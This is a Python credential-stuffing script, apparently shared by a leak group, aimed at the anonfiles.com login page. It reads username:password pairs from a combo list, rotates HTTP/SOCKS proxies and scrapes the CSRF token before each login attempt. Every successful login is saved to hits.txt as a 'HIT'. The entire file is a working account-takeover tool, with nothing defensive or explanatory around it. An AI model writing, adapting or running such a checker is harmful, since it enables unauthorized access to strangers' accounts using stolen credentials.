#!/usr/bin/env python3

import os
import requests
from bs4 import BeautifulSoup
from colorama import *
import random

# Variables

proxiesc = os.path.isfile("proxies.txt")
filec = os.path.isfile("combo.txt")
path = os.getcwd()


def banner():
    print(Fore.RED + """
 █████╗ ███╗   ██╗ ██████╗ ███╗   ██╗███████╗██╗██╗     ███████╗███████╗
██╔══██╗████╗  ██║██╔═══██╗████╗  ██║██╔════╝██║██║     ██╔════╝██╔════╝
███████║██╔██╗ ██║██║   ██║██╔██╗ ██║█████╗  ██║██║     █████╗  ███████╗
██╔══██║██║╚██╗██║██║   ██║██║╚██╗██║██╔══╝  ██║██║     ██╔══╝  ╚════██║
██║  ██║██║ ╚████║╚██████╔╝██║ ╚████║██║     ██║███████╗███████╗███████║
╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝     ╚═╝╚══════╝╚══════╝╚══════╝""")

    print(Fore.BLUE + """                                                                        
 ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗                 
██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗                
██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝                
██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗                
╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║                
 ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝""")


# Main


def checker():
    banner()
    print("\n\n\n")
    req = requests.session()
    a = open("combo.txt", "r")
    stop = "default"
    proxies = open("proxies.txt", "r").readlines()
    ptype = input(
        Fore.YELLOW + "PROXY TYPE [" + Fore.GREEN + "http" + Fore.YELLOW + "/" + Fore.GREEN + "socks4" + Fore.YELLOW + "/" + Fore.GREEN + "socks5" + Fore.YELLOW + "]: ")

    HTTP = []
    SOCKS4 = []
    SOCKS5 = []

    proxy = {ptype: random.choice(proxies)}

    o = requests.Session()
    o.proxy = proxy

    gettoken = req.get("https://anonfiles.com/login", proxies=proxy)
    soup = BeautifulSoup(gettoken.text, "lxml")
    token = soup.find("input", {"name": "_token"})["value"]

    file = [i.rstrip() for i in a.readlines()]
    for lines in file:
        combo = lines.split(":")
        param = {"username": combo[0], "password": combo[1], "_token": token}
        try:
            source = req.post("https://anonfiles.com/login", proxies=proxy, data=param)
            if """<li><a href="https://anonfiles.com/logout">Logout</a></li>""" in source.text:
                print(Fore.BLUE + "[" + Fore.GREEN + "i" + Fore.BLUE + "]" + Fore.GREEN + " VALID >>>> " + Fore.YELLOW +
                      combo[0] + ":" + combo[1])
                req.get("https://anonfiles.com/logout", proxies=proxy)
                capture = "=-=-=> HIT <=-=-=\n\n" + "Username: " + combo[0] + "\n" + "Password: " + combo[1] + "\n\n" \
                                                                                                               "=-=-=> CHECKER BY DeepWaterLeaks and @TheMasterCH<=-=-=\n\n "
                res = open(path + "/hits.txt", "a")
                res.write(capture)
            else:
                print(Fore.BLUE + "[" + Fore.RED + "x" + Fore.BLUE + "]" + Fore.RED + " INVALID >>>> " + Fore.YELLOW +
                      combo[0] + ":" + combo[1])
        except Exception:
            continue
        except KeyboardInterrupt:
            print("CTRL + C WERE PRESSED")
        if stop in combo[0]:
            print("Done! View your hits in the hits.txt file")


# Check if files are there
if filec == True:
    print(Fore.BLUE + "[" + Fore.GREEN + "i" + Fore.BLUE + "]" + Fore.GREEN + " COMBO.TXT FOUND")
    if proxiesc == True:
        print(Fore.BLUE + "[" + Fore.GREEN + "i" + Fore.BLUE + "]" + Fore.GREEN + " COMBO.TXT FOUND")
        checker()
    else:
        print(Fore.BLUE + "[" + Fore.RED + "!" + Fore.BLUE + "]" + Fore.RED + " PROXIES.TXT NOT FOUND!")
else:
    print(Fore.BLUE + "[" + Fore.RED + "!" + Fore.BLUE + "]" + Fore.RED + "PROXIES.TXT NOT FOUND!")
